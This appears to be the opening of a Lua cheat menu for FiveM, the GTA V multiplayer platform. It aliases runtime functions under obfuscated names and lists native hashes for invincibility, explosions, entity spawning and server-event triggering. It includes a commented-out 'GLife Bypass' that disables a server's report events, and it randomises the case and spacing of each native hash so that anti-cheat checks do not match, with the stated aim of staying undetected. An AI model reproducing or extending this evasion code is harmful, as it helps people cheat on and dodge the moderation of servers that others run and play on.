

--pleasesearchforthiskeytoknowwhatmenusarehere

--DONT PRESS ESC WHEN BOX COMES UP

local closestPed = {
    ElPed,
    ElDeady
}

local stopNow = false

--GLife Bypass
--[[RfPsUKHSFWJuBEJuz.rE.LumThread(function()
    while true do
        reportEvent = nil
        reportEvent2 = nil
        Citizen.Wait(500)
    end
end)]]

-- New Citizen Table --
local DAKdHpjJWWtmS = Citizen.Wait(8273)

-- New Lua Table --
local GGimTgRrVcbgJzAMOv = Citizen.Wait(8274)

-- shit that is needed to stay ud --
local RfPsUKHSFWJuBEJuz = {
    Console = {},
    TR = {},
    rE = {
        LumThread = DAKdHpjJWWtmS.CreateThread,
        LumWait = DAKdHpjJWWtmS.Wait,
        LumInv = DAKdHpjJWWtmS.InvokeNative,
        LumRRA = DAKdHpjJWWtmS.ReturnResultAnyway,
        LumI = DAKdHpjJWWtmS.PointerValueInt,
        LumPVV = DAKdHpjJWWtmS.PointerValueVector,
        LumRAF = DAKdHpjJWWtmS.ResultAsFloat,
        LumRAS = DAKdHpjJWWtmS.ResultAsString,
        LumRAL = DAKdHpjJWWtmS.ResultAsLong,
        LumRAV = DAKdHpjJWWtmS.ResultAsVector,
        LumRAI = DAKdHpjJWWtmS.ResultAsInteger,
        LumPVF = DAKdHpjJWWtmS.PointerValueFloat,
        LumRAO = DAKdHpjJWWtmS.ResultAsObject,
        LumII = DAKdHpjJWWtmS.PointerValueIntInitialized,
        LumToString = GGimTgRrVcbgJzAMOv.functions.tostring,
        LumToNum = GGimTgRrVcbgJzAMOv.functions.tonumber,
        pront = print,
        LumMetaTable = GGimTgRrVcbgJzAMOv.functions.setmetatable,
        LumIpairs = GGimTgRrVcbgJzAMOv.functions.ipairs,
        Lumpairs = GGimTgRrVcbgJzAMOv.functions.pairs,
        LumVector3 = GGimTgRrVcbgJzAMOv.functions.vector3,
        LumTyper = GGimTgRrVcbgJzAMOv.functions.type,
        LumMath = {
            LumCeli = GGimTgRrVcbgJzAMOv.tables.math.ceil,
            LumFloor = GGimTgRrVcbgJzAMOv.tables.math.floor,
            LumSin = GGimTgRrVcbgJzAMOv.tables.math.sin,
            LumRad = GGimTgRrVcbgJzAMOv.tables.math.rad,
            LumAbs = GGimTgRrVcbgJzAMOv.tables.math.abs,
            LumCos = GGimTgRrVcbgJzAMOv.tables.math.cos,
            LumPi = GGimTgRrVcbgJzAMOv.tables.math.pi,
            LumSqrt = GGimTgRrVcbgJzAMOv.tables.math.sqrt,
            LumRand = GGimTgRrVcbgJzAMOv.tables.math.random,
        },
        LumString = {
            LumUpper = GGimTgRrVcbgJzAMOv.tables.string.upper,
            LumLower = GGimTgRrVcbgJzAMOv.tables.string.lower,
            LumFind = GGimTgRrVcbgJzAMOv.tables.string.find,
            LumSub = GGimTgRrVcbgJzAMOv.tables.string.sub,
            LumGsub = GGimTgRrVcbgJzAMOv.tables.string.gsub,
            LumGmatch = GGimTgRrVcbgJzAMOv.tables.string.gmatch,
            LumChar = GGimTgRrVcbgJzAMOv.tables.string.char,
            LumMatch = GGimTgRrVcbgJzAMOv.tables.string.match
        },
        LumTable = {
            LumPack = GGimTgRrVcbgJzAMOv.tables.table.pack,
            LumInsert = GGimTgRrVcbgJzAMOv.tables.table.insert,
            LumUnPack = GGimTgRrVcbgJzAMOv.tables.table.unpack,
            LumSort = GGimTgRrVcbgJzAMOv.tables.table.sort,
            LumRemove = GGimTgRrVcbgJzAMOv.tables.table.remove,
            LumMsgPack = GGimTgRrVcbgJzAMOv.tables.msgpack.pack,
            LumMsgUnpack = GGimTgRrVcbgJzAMOv.tables.msgpack.unpack
        },
        LumJson = {
            LumEncode = GGimTgRrVcbgJzAMOv.tables.json.encode,
            LumDecode = GGimTgRrVcbgJzAMOv.tables.json.decode,
        },
        LumRoutine = {
            LumWrap = GGimTgRrVcbgJzAMOv.tables.coroutine.wrap,
            LumYeild = GGimTgRrVcbgJzAMOv.tables.coroutine.yield,
        }
    },
    Keys = { 
        ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57, 
        ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, 
        ["="] = 83, ["BACKSPACE"] = 177, ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, 
        ["["] = 39, ["]"] = 40, ["ENTER"] = 18, ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182, 
        ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81, ["LEFTCTRL"] = 36, 
        ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70, ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178, ["LEFT"] = 174, 
        ["RIGHT"] = 175, ["UP"] = 172, ["DOWN"] = 173, ["NENTER"] = 201, ["MWHEELUP"] = 15, ["MWHEELDOWN"] = 14, ["N4"] = 108, ["N5"] = 60, 
        ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118, ["MOUSE1"] = 24, ["MOUSE2"] = 25, ["MOUSE3"] = 348
    },
    charsrep = {
        ['a'] = {'a', 'A'},
        ['b'] = {'b', 'B'},
        ['c'] = {'c', 'C'},
        ['d'] = {'d', 'D'},
        ['e'] = {'e', 'E'},
        ['f'] = {'f', 'F'},
        ['g'] = {'g', 'G'},
        ['h'] = {'h', 'H'},
        ['i'] = {'i', 'I'},
        ['j'] = {'j', 'J'},
        ['k'] = {'k', 'K'},
        ['l'] = {'l', 'L'},
        ['m'] = {'m', 'M'},
        ['n'] = {'n', 'N'},
        ['o'] = {'o', 'O'},
        ['p'] = {'p', 'O'},
        ['q'] = {'q', 'Q'},
        ['r'] = {'r', 'R'},
        ['s'] = {'s', 'S'},
        ['t'] = {'t', 'T'},
        ['u'] = {'u', 'U'},
        ['v'] = {'v', 'V'},
        ['w'] = {'w', 'W'},
        ['x'] = {'x', 'X'},
        ['y'] = {'y', 'Y'},
        ['z'] = {'z', 'Z'},
    },
    numbers = {
        '1', 
        '2', 
        '3', 
        '4', 
        '5', 
        '6', 
        '7', 
        '8', 
        '9', 
        '0'
    },
    elspoofednatives = {
        ['GetHashKey'] = '0xD24D37CC275948CC',
        ['BigCheckerino'] = '0xEB014D1CC',
        ['rEUid'] = '0x762376233638',
        ['WebReq'] = '0x762376233636',
        ['DrawRect'] = '0x3A618A217E5154F0',
        ['IsDisabledControlJustReleased'] = '0x305C8DCD79DA8B0F',
        ['SetMouseCursorActiveThisFrame'] = '0xAAE7CE1D63167423',
        ['DisableAllControlActions'] = '0x5F4B6931816E599B',
        ['GetActiveScreenResolution'] = '0x873C9F3104101DD3',
        ['GetNuiCursorPosition'] = '0xbdba226f',
        ['SetTextFont'] = '0x66E0276CC5F6B9DA',
        ['SetTextScale'] = '0x07C837F9A01C34C9',
        ['SetTextCentre'] = '0xC02F4DBFB51D988B',
        ['SetTextColour'] = '0xBE6B23FFA53FB442',
        ['BeginTextCommandDisplayText'] = '0x25FBB336DF1804CB',
        ['AddTextComponentSubstringPlayerName'] = '0x6C188BE134E074AA',
        ['EndTextCommandDisplayText'] = '0xCD015E5BB0D96A57',
        ['IsDisabledControlPressed'] = '0xE2587F8CBBD87B1D',
        ['SetMouseCursorSprite'] = '0x8DB8CFFD58B62552',
        ['PlaySoundFrontend'] = '0x67C540AA08E4A6F5',
        ['BeginTextCommandWidth'] = '0x54CE8AC98E120CAB',
        ['EndTextCommandGetWidth'] = '0x85F061DA64ED2F67',
        ['HasStreamedTextureDictLoaded'] = '0x0145F696AAAAD2E4',
        ['RequestStreamedTextureDict'] = '0xDFA2EF8E04127DD5',
        ['DrawSprite'] = '0xE7FFAE5EBF23D890',
        ['GetDuiHandle'] = '0x1655d41d',
        ['CreateRuntimeTextureFromDuiHandle'] = '0xb135472b',
        ['CreateRuntimeTxd'] = '0x1f3ac778',
        ['CreateDui'] = '0x23eaf899',
        ['SetEntityHealth'] = '0x6B76DC1F3AE6E6A3',
        ['TriggerServerEventInternal'] = '0x7FDD1128',
        ['TriggerEventInternal'] = '0x91310870',
        ['StopScreenEffect'] = '0x068E835A1D0DC0E3',
        ['ClearPedBloodDamage'] = '0x8FE22675A5A45817',
        ['GetEntityCoords'] = '0x3FEF770D40960D5A',
        ['PlayerPedId'] = '0xD80958FC74E988A6',
        ['GetPlayerPed'] = '0x43A66C31C68491C0',
        ['NetworkResurrectLocalPlayer'] = '0xEA23C49EAA83ACFB',
        ['SetEntityCoordsNoOffset'] = '0x239A3351AC1DA385',
        ['AddArmourToPed'] = '0x5BA652A0CD14DF2F',
        ['SetPlayerInvincible'] = '0x239528EACDC3E7DE',
        ['SetEntityInvincible'] = '0x3882114BDE571AD4',
        ['SetEntityVisible'] = '0xEA1C610A04DB6BBB',
        ['SetRunSprintMultiplierForPlayer'] = '0x6DB47AA77FD94E09',
        ['SetPedMoveRateOverride'] = '0x085BF80FA50A39D1',
        ['ResetPlayerStamina'] = '0xA6F312FCCE9C1DFE',
        ['SetSuperJumpThisFrame'] = '0x57FFF03E423A4C0B',
        ['PlayerId'] = '0x4F8644AF03D0E0D6',
        ['RequestModel'] = '0x963D27A58DF860AC',
        ['HasModelLoaded'] = '0x98A4EB5D89A0C952',
        ['SetPlayerModel'] = '0x00A1CADD00108836',
        ['SetModelAsNoLongerNeeded'] = '0xE532F5D78798DAAB',
        ['SetPedHeadBlendData'] = '0x9414E18B9434C2FE',
        ['SetPedHeadOverlay'] = '0x48F44967FA05CC1E',
        ['SetPedHeadOverlayColor'] = '0x497BF74A7B9CB952',
        ['SetPedComponentVariation'] = '0x262B14F48D29DE80',
        ['SetPedHairColor'] = '0x4CFFC65454C93A49',
        ['SetPedPropIndex'] = '0x93376B65A266EB5F',
        ['SetPedDefaultComponentVariation'] = '0x45EEE61580806D63',
        ['CreateCam'] = '0xC3981DCE61D9E13F',
        ['RenderScriptCams'] = '0x07E5B515DB0636FC',
        ['SetCamActive'] = '0x026FB97D0A425F84',
        ['SetFocusEntity'] = '0x198F77705FA0931D',
        ['GetControlNormal'] = '0xEC3C9B8D5327B563',
        ['GetDisabledControlNormal'] = '0x11E65974A982637C',
        ['GetEntityRotation'] = '0xAFBD61CC738D9EB9',
        ['SetCamRot'] = '0x85973643155D0B07',
        ['GetGroundZFor_3dCoord'] = '0xC906A7DAB05C8D2B',
        ['GetOffsetFromEntityInWorldCoords'] = '0x1899F328B0E12848',
        ['SetCamCoord'] = '0x4D41783FB745E42E',
        ['ClearFocus'] = '0x31B73D1EA9F01DA2',
        ['AddTextEntry'] = '0x32ca01c3',
        ['DisplayOnscreenKeyboard'] = '0x00DC833F2568DBF6',
        ['UpdateOnscreenKeyboard'] = '0x0CF2B696BBF945AE',
        ['GetOnscreenKeyboardResult'] = '0x8362B09B91893647',
        ['EnableAllControlActions'] = '0xA5FFE9B05F199DE7',
        ['GetActivePlayers'] = '0xcf143fb9',
        ['GetPlayerServerId'] = '0x4d97bcc7',
        ['GetPlayerName'] = '0x6D0DE6A7B5DA71F8',
        ['DestroyCam'] = '0x865908C81A2C22E9',
        ['ClearTimecycleModifier'] = '0x0F07E7745A236711',
        ['IsModelValid'] = '0xC0296A2EDF545E92',
        ['IsModelAVehicle'] = '0x19AAC8F07BFEC53E',
        ['CreateVehicle'] = '0xAF35D0D2583051B0',
        ['SetPedIntoVehicle'] = '0xF75B0D629E1C063D',
        ['CreateObject'] = '0x509D5878EB39E842',
        ['ShootSingleBulletBetweenCoords'] = '0x867654CBC7606F2C',
        ['RequestNamedPtfxAsset'] = '0xB80D8756B4668AB6',
        ['HasNamedPtfxAssetLoaded'] = '0x8702416E512EC454',
        ['UseParticleFxAsset'] = '0x6C38AF3693A69A91',
        ['StartNetworkedParticleFxNonLoopedAtCoord'] = '0xF56B8137DF10135D',
        ['AttachEntityToEntity'] = '0x6B9BBD38AB0796DF',
        ['GetPedBoneIndex'] = '0x3F428D08BE5AAE31',
        ['IsPedInAnyVehicle'] = '0x997ABD671D25CA0B',
        ['GetVehiclePedIsUsing'] = '0x6094AD011A2EA87D',
        ['GetVehicleMaxNumberOfPassengers'] = '0xA7C4F2C6E744A550',
        ['IsVehicleSeatFree'] = '0x22AC59A870E6A669',
        ['GetVehiclePedIsIn'] = '0x9A9112A0FE9A4713',
        ['DisablePlayerFiring'] = '0x5E6CC07646BBEAB8',
        ['ClearPedTasks'] = '0xE1EF3C1216AFF2CD',
        ['ClearPedTasksImmediately'] = '0xAAA34F8A7CB32098',
        ['CreatePed'] = '0xD49F9B0955C367DE',
        ['FreezeEntityPosition'] = '0x428CA6DBD1094446',
        ['AddRope'] = '0xE832D760399EB220',
        ['SetPedCanRagdoll'] = '0xB128377056A54E2A',
        ['ClearPedSecondaryTask'] = '0x176CECF6F920D707',
        ['TaskSetBlockingOfNonTemporaryEvents'] = '0x90D2156198831D69',
        ['SetPedFleeAttributes'] = '0x70A2D1137C8ED7C9',
        ['SetPedCombatAttributes'] = '0x9F7794730795E019',
        ['SetPedSeeingRange'] = '0xF29CF591C4BF6CEE',
        ['SetPedHearingRange'] = '0x33A8F7F7D5F7F33C',
        ['SetPedAlertness'] = '0xDBA71115ED9941A6',
        ['SetPedKeepTask'] = '0x971D38760FBC02EF',
        ['IsDisabledControlJustPressed'] = '0x91AEF906BCA88877',
        ['IsDisabledControlReleased'] = '0xFB6C4072E9A32E92',
        ['SetVehicleModKit'] = '0x1F2AA07F00B3217A',
        ['GetNumVehicleMods'] = '0xE38E9162A2500646',
        ['GetModTextLabel'] = '0x8935624F8C5592CC',
        ['GetLabelText'] = '0x7B5280EBA9840C72',
        ['SetVehicleMod'] = '0x6AF0636DDEDCB6DD',
        ['ToggleVehicleMod'] = '0x2A1F4F37F95BAD08',
        ['SetVehicleGravityAmount'] = '0x1a963e58',
        ['SetVehicleForwardSpeed'] = '0xAB54A438726D25D5',
        ['SetVehicleNumberPlateText'] = '0x95A88F0B409CDA47',
        ['DoesEntityExist'] = '0x7239B21A38F536BA',
        ['GetVehicleColours'] = '0xA19435F193E081AC',
        ['GetVehicleExtraColours'] = '0x3BC4245933A166F7',
        ['DoesExtraExist'] = '0x1262D55792428154',
        ['IsVehicleExtraTurnedOn'] = '0xD2E6822DBFD6C8BD',
        ['GetEntityModel'] = '0x9F47B058362C84B5',
        ['GetVehicleWheelType'] = '0xB3ED1BFB4BE636DC',
        ['GetVehicleWindowTint'] = '0x0EE21293DAD47C95',
        ['IsVehicleNeonLightEnabled'] = '0x8C4B92553E4766A5',
        ['GetVehicleNeonLightsColour'] = '0x7619EEE8C886757F',
        ['GetVehicleTyreSmokeColor'] = '0xB635392A4938B3C3',
        ['GetVehicleMod'] = '0x772960298DA26FDB',
        ['IsToggleModOn'] = '0x84B233A8C8FC8AE7',
        ['GetVehicleLivery'] = '0x2BB9230590DA5E8A',
        ['SetVehicleFixed'] = '0x115722B1B9C14C1C',
        ['SetVehicleLightsMode'] = '0x1FD09E7390A74D54',
        ['SetVehicleLights'] = '0x34E710FF01247C5A',
        ['SetVehicleBurnout'] = '0xFB8794444A7D60FB',
        ['SetVehicleEngineHealth'] = '0x45F6D8EEF34ABEF1',
        ['SetVehicleFuelLevel'] = '0xba970511',
        ['SetVehicleOilLevel'] = '0x90d1cad1',
        ['SetVehicleDirtLevel'] = '0x79D3B596FE44EE8B',
        ['SetVehicleOnGroundProperly'] = '0x49733E92263139D1',
        ['SetEntityAsMissionEntity'] = '0xAD738C3085FE7E11',
        ['DeleteVehicle'] = '0xEA386986E786A54F',
        ['GetVehicleClass'] = '0x29439776AAA00A62',
        ['SetVehicleWheelType'] = '0x487EB21CC7295BA1',
        ['SetVehicleExtraColours'] = '0x2036F561ADD12E33',
        ['SetVehicleColours'] = '0x4F1D4BE3A7F24601',
        ['SetVehicleNeonLightEnabled'] = '0x2AA720E4287BF269',
        ['SetVehicleNeonLightsColour'] = '0x8E0A582209A62695',
        ['SetVehicleWindowTint'] = '0x57C51E6BAD752696',
        ['IsWeaponValid'] = '0x937C71165CF334B3',
        ['GiveWeaponToPed'] = '0xBF0FD6E56C964FCB',
        ['GetSelectedPedWeapon'] = '0x0A6DB4965674D243',
        ['SetWeaponDamageModifier'] = '0x4757F00BC6323CFE',
        ['SetPlayerMeleeWeaponDamageModifier'] = '0x4A3DC7ECCC321032',
        ['SetPedInfiniteAmmoClip'] = '0x183DADC6AA953186',
        ['GetPedLastWeaponImpactCoord'] = '0x6C4D0409BA1A2BC2',
        ['AddExplosion'] = '0xE3AD2BDBAEE269AC',
        ['HasPedGotWeaponComponent'] = '0xC593212475FAE340',
        ['GiveWeaponComponentToPed'] = '0xD966D51AA5B28BB9',
        ['RemoveWeaponComponentFromPed'] = '0x1E8BE90C74FB4C09',
        ['AddAmmoToPed'] = '0x78F0424C34306220',
        ['GetNumResources'] = '0x863f27b',
        ['GetResourceByFindIndex'] = '0x387246b7',
        ['GetResourceState'] = '0x4039b485',
        ['CreateCamWithParams'] = '0xB51194800B257161',
        ['GetGameplayCamFov'] = '0x65019750A0324133',
        ['GetCamCoord'] = '0xBAC038F7459AE5AE',
        ['GetCamRot'] = '0x7D304C1C955E3E12',
        ['GetShapeTestResult'] = '0x3D87450E15D98694',
        ['StartShapeTestRay'] = '0x377906D8A31E5586',
        ['SetHdArea'] = '0xB85F26619073E775',
        ['DisplayRadar'] = '0xA0EBB943C300E693',
        ['SetFocusPosAndVel'] = '0xBB7454BAFF08FE25',
        ['NetworkRequestControlOfEntity'] = '0xB69317BF5E782347',
        ['DeleteEntity'] = '0xAE3CBE5BF394C9C9',
        ['DeleteObject'] = '0x539E0AE3E6634B9F',
        ['DeletePed'] = '0x9614299DCB53E54B',
        ['SetEntityCoords'] = '0x06843DA7060A026B',
        ['SetEntityRotation'] = '0x8524A8B0171D5E07',
        ['GetGameplayCamRot'] = '0x837765A25378F0BB',
        ['SetEntityVelocity'] = '0x1C99BB7B6E96D16F',
        ['NetworkHasControlOfEntity'] = '0x01BF60A500E28887',
        ['SetNetworkIdCanMigrate'] = '0x299EEB23175895FC',
        ['NetworkGetNetworkIdFromEntity'] = '0xA11700682F3AD45C',
        ['GetPedInVehicleSeat'] = '0xBB40DD2270B65366',
        ['GetEntityHeading'] = '0xE83D4F9BA2A38914',
        ['RequestScaleformMovie'] = '0x11FE353CF9733E6F',
        ['HasScaleformMovieLoaded'] = '0x85F01B8D5B90570E',
        ['PushScaleformMovieFunction'] = '0xF6E48914C7A8694E',
        ['PushScaleformMovieFunctionParameterBool'] = '0xC58424BA936EB458',
        ['PopScaleformMovieFunctionVoid'] = '0xC6796A8FFA375E53',
        ['PushScaleformMovieFunctionParameterInt'] = '0xC3D0841A0CC546A6',
        ['PushScaleformMovieMethodParameterButtonName'] = '0xE83A3E3557A56640',
        ['PushScaleformMovieFunctionParameterString'] = '0xBA7148484BD90365',
        ['DrawScaleformMovieFullscreen'] = '0x0DF606929C105BE1',
        ['GetFirstBlipInfoId'] = '0x1BEDE233E6CD2A1F',
        ['DoesBlipExist'] = '0xA6DB27D19ECBB7DA',
        ['GetBlipInfoIdCoord'] = '0xFA7C7F0AADF25D09',
        ['SetPedCoordsKeepVehicle'] = '0x9AFEFF481A85AB2E',
        ['NetworkRegisterEntityAsNetworked'] = '0x06FAACD625D80CAA',
        ['VehToNet'] = '0xB4C94523F023419C',
        ['IsEntityInWater'] = '0xCFB0A0D8EDD145A3',
        ['SetVehicleEngineOn'] = '0x2497C4717C8B881E',
        ['SetPedMaxTimeUnderwater'] = '0x6BA428C528D9E522',
        ['GetPedBoneCoords'] = '0x17C07FC640E86B4E',
        ['GetDistanceBetweenCoords'] = '0xF1B760881820C952',
        ['GetScreenCoordFromWorldCoord'] = '0x34E82F05DF2974F5',
        ['IsEntityDead'] = '0x5F9532F3B5CC2551',
        ['HasEntityClearLosToEntity'] = '0xFCDFF7B72D23A1AC',
        ['IsPedShooting'] = '0x34616828CD07F1A1',
        ['IsEntityOnScreen'] = '0xE659E47AF827484B',
        ['FindFirstPed'] = '0xfb012961',
        ['FindNextPed'] = '0xab09b548',
        ['EndFindPed'] = '0x9615c2ad',
        ['SetDrawOrigin'] = '0xAA0008F3BBB8F416',
        ['SetTextProportional'] = '0x038C1F517D7FDCF8',
        ['SetTextDropshadow'] = '0x465C84BC39F1C351',
        ['SetTextEdge'] = '0x441603240D202FA6',
        ['SetTextOutline'] = '0x2513DFB0FB8400FE',
        ['SetTextEntry'] = '0x25FBB336DF1804CB',
        ['AddTextComponentString'] = '0x6C188BE134E074AA',
        ['DrawText'] = '0xCD015E5BB0D96A57',
        ['ClearDrawOrigin'] = '0xFF0B610F6BE0D7AF',
        ['GetClosestVehicle'] = '0xF73EB622C4F1689B',
        ['GetGameplayCamRelativeHeading'] = '0x743607648ADD4587',
        ['GetGameplayCamRelativePitch'] = '0x3A6867B4845BEDA2',
        ['GetPedPropIndex'] = '0x898CC20EA75BACD8',
        ['GetPedPropTextureIndex'] = '0xE131A28626F81AB2',
        ['GetPedDrawableVariation'] = '0x67F3780DD425D4FC',
        ['GetPedPaletteVariation'] = '0xE3DD5F2A84B42281',
        ['GetPedTextureVariation'] = '0x04A355E041E004E6',
        ['RequestAnimDict'] = '0xD3BD40951412FEF6',
        ['HasAnimDictLoaded'] = '0xD031A9162D01088C',
        ['TaskPlayAnim'] = '0xEA47FE3719165B94',
        ['SetNewWaypoint'] = '0xFE43368D2AA4F2FC',
        ['NetworkIsPlayerActive'] = '0xB8DFD30D6973E135',
        ['GetBlipFromEntity'] = '0xBC8DBDCA2436F7E8',
        ['AddBlipForEntity'] = '0x5CDE92C702A8FCE7',
        ['SetBlipSprite'] = '0xDF735600A4696DAF',
        ['ShowHeadingIndicatorOnBlip'] = '0x5FBCA48327B914DF',
        ['GetBlipSprite'] = '0x1FC877464A04FC4F',
        ['GetEntityHealth'] = '0xEEF059FAD016D209',
        ['HideNumberOnBlip'] = '0x532CFF637EF80148',
        ['SetBlipRotation'] = '0xF87683CDF73C3F6E',
        ['SetBlipNameToPlayerName'] = '0x127DE7B20C60A6A3',
        ['SetBlipScale'] = '0xD38744167B2FA257',
        ['IsPauseMenuActive'] = '0xB0034A223497FFCB',
        ['SetBlipAlpha'] = '0x45FF974EEE1C8734',
        ['RemoveBlip'] = '0x86A652570E5F25DD',
        ['GetGameTimer'] = '0x9CD27B0045628463',
        ['SetEntityAlpha'] = '0x44A0870B7E92D7C0',
        ['SetEntityCollision'] = '0x1A9205C1B9EE827F',
        ['SetTransitionTimecycleModifier'] = '0x3BCF567485E1971C',
        ['GetDisplayNameFromVehicleModel'] = '0xB215AAC32D25D019',
        ['SetPedSuffersCriticalHits'] = '0xEBD76F2359F190AC',
        ['SetWeatherTypeNowPersist'] = '0xED712CA327900C8A',
        ['IsThisModelABicycle'] = '0xBF94DD42F63BDED2',
        ['IsThisModelABoat'] = '0x45A9187928F4B9E3',
        ['IsThisModelAHeli'] = '0xDCE4334788AF94EA',
        ['IsThisModelACar'] = '0x7F6DB52EEFC96DF8',
        ['IsThisModelAJetski'] = '0x9537097412CF75FE',
        ['IsThisModelAPlane'] = '0xA0948AB42D7BA0DE',
        ['IsThisModelATrain'] = '0xAB935175B22E822B',
        ['IsThisModelAQuadbike'] = '0x39DAC362EE65FA28',
        ['IsThisModelAnAmphibiousCar'] = '0x633F6F44A537EBB6',
        ['IsThisModelAnAmphibiousQuadbike'] = '0xA1A9FC1C76A6730D',
        ['TaskCombatPed'] = '0xF166E48407BAC484',
        ['IsPedDeadOrDying'] = '0x3317DEDB88C95038',
        ['TaskSmartFleeCoord'] = '0x94587F17E9C365D5',
        ['SetPedCombatAbility'] = '0xC7622C0D36B2FDA8',
        ['SetPedCombatMovement'] = '0x4D9CA1009AFBD057',
        ['SetCombatFloat'] = '0xFF41B4B141ED981C',
        ['SetPedAccuracy'] = '0x7AEFB85C1D49DEB6',
        ['SetPedFiringPattern'] = '0x9AC577F5A12AD8A9',
        ['GetClosestVehicleNodeWithHeading'] = '0xFF071FB798B803B0',
        ['CreatePedInsideVehicle'] = '0x7DD959874C1FD534',
        ['TaskVehicleDriveToCoordLongrange'] = '0x158BB33F920D360C',
        ['GetWeaponDamage'] = '0x3133B907D8B32053',
        ['FindFirstVehicle'] = '0x15e55694',
        ['FindNextVehicle'] = '0x8839120d',
        ['EndFindVehicle'] = '0x9227415a',
        ['SetVehicleDoorsLockedForAllPlayers'] = '0xA2F80B8D040727CC',
        ['ModifyVehicleTopSpeed'] = '0x93A3996368C94158',
        ['SetVehicleCheatPowerIncrease'] = '0xB59E4BD37AE292DB',
        ['RemoveWeaponFromPed'] = '0x4899CB088EDF59B8',
        ['DrawLine'] = '0x6B7256074AE34680',
        ['DrawMarker'] = '0x28477EC23D892089',
        ['GetEntityVelocity'] = '0x4805D2B1D8CF94A9',
        ['ApplyForceToEntity'] = '0xC5F68BE9613E2D18',
        ['GetGameplayCamCoord'] = '0x14D6F5678D8F1B37',
        ['SetPedToRagdoll'] = '0xAE99FB955581844A',
        ['StatSetInt'] = '0xB3271D7AB655B441',
        ['SetBlipCoords'] = '0xAE2AF67E9D9AF65D',
        ['SetBlipCategory'] = '0x234CDD44D996FD9A',
        ['AddBlipForCoord'] = '0x5A039BB0BCA604B6',
        ['BeginTextCommandSetBlipName'] = '0xF9113A30DE5C6670',
        ['EndTextCommandSetBlipName'] = '0xBC38B49BCB83BC9B',
        ['SetPedCanBeKnockedOffVehicle'] = '0x7A6535691B477C48',
        ['IsEntityAPed'] = '0x524AC5ECEA15343E',
        ['IsEntityAVehicle'] = '0x6AC7003FA6E5575E',
        ['IsEntityAnObject'] = '0x8D68C8FD0FACA94E',
        ['IsModelAPed'] = '0x75816577FEA6DAD5',
        ['SetVehicleDoorsLocked'] = '0xB664292EAECF7FA6',
        ['TaskVehicleTempAction'] = '0xC429DCEEB339E129',
        ['LoadResourceFile'] = '0x76a9ee1f',
        ['ResetEntityAlpha'] = '0x9B1E824FFBB7027A',
        ['NetworkGetPlayerIndexFromPed'] = '0x6C0E2E0125610278',
        ['IsPedAPlayer'] = '0x12534C348C6CB68B',
        ['GetPedSourceOfDeath'] = '0x93C8B64DEB84728C',
        ['GetNumResourceMetadata'] = '0x776e864',
        ['GetResourceMetadata'] = '0x964bab1d',
        ['SetVehicleAlarmTimeLeft'] = '0xc108ee6f',
        ['GetIsVehicleEngineRunning'] = '0xAE31E7DF9B5B132E',
        ['SetVehicleUndriveable'] = '0x8ABA6AF54B942B95',
        ['TaskVehicleDriveToCoord'] = '0xE2A2AA2F659D77A7',
        ['SetPedCombatRange'] = '0x3C606747B23E497B',
        ['GetIsTaskActive'] = '0xB0760331C7AA4155',
        ['GetPlayerFromServerId'] = '0x344ea166',
        ['PedToNet'] = '0x0EDEC3C276198689',
        ['TaskVehicleDriveWander'] = '0x480142959D337D00'
    },
    Colors = {
        White = {222, 222, 255},
        Blue = {2, 21, 255},
        ElectricB = {3, 83, 255},
        MintG = {0, 255, 140},
        LimeG = {94, 255, 1},
        Yellow = {255, 255, 0},
        GoldenShower = {255, 150, 0},
        Orange = {255, 62, 0},
        Red = {255, 1, 1},
        PonyPink = {255, 50, 100},
        HotPink = {255, 5, 190},
        Purple = {35, 1, 255},
        Blacklight = {15, 3, 255}
    }
}

RfPsUKHSFWJuBEJuz.rh = function(hash)
    local newh = ''
    local oldh = hash
    -- getting split
    local split = { oldh:match( (oldh:gsub(".", "(.)")) ) }
    -- randomizing chars
    for i = 1, #split do
        local isnumber = 0
        for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(RfPsUKHSFWJuBEJuz.numbers) do
            if split[i] == v then
                isnumber = isnumber + 1
            end
        end
        if isnumber == 0 then
            local n = RfPsUKHSFWJuBEJuz.charsrep[split[i]:lower()][RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(1,2)]
            split[i] = n
        end
    end
    -- forming string
    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(split) do
        newh = newh .. v
    end
    -- checking if is duplicated
    if newh == hash then
        return RfPsUKHSFWJuBEJuz.rh(hash)
    end
    -- adding random spaces
    local rs = RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(0, 2)
    local rp = RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(0, 2)
    if rs > 0 then
        for i = 1, rs do
            newh = newh .. ' '
        end
    end
    if rp > 0 then
        for i = 1, rp do
            newh = ' ' .. newh
        end
    end
    return newh
end

RfPsUKHSFWJuBEJuz.ReSpoofHashes = function()
    for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(RfPsUKHSFWJuBEJuz.elspoofednatives) do
        local old = v
        RfPsUKHSFWJuBEJuz.elspoofednatives[k] = RfPsUKHSFWJuBEJuz.rh(v)
    end
end

RfPsUKHSFWJuBEJuz.ReSpoofHashes()

RfPsUKHSFWJuBEJuz.rE.HashFucker = function(value)
    return RfPsUKHSFWJuBEJuz.rE.LumInv(RfPsUKHSFWJuBEJuz.elspoofednatives['GetHashKey'], RfPsUKHSFWJuBEJuz.rE.LumToString(value), RfPsUKHSFWJuBEJuz.rE.LumRRA(), RfPsUKHSFWJuBEJuz.rE.LumRAI())
end

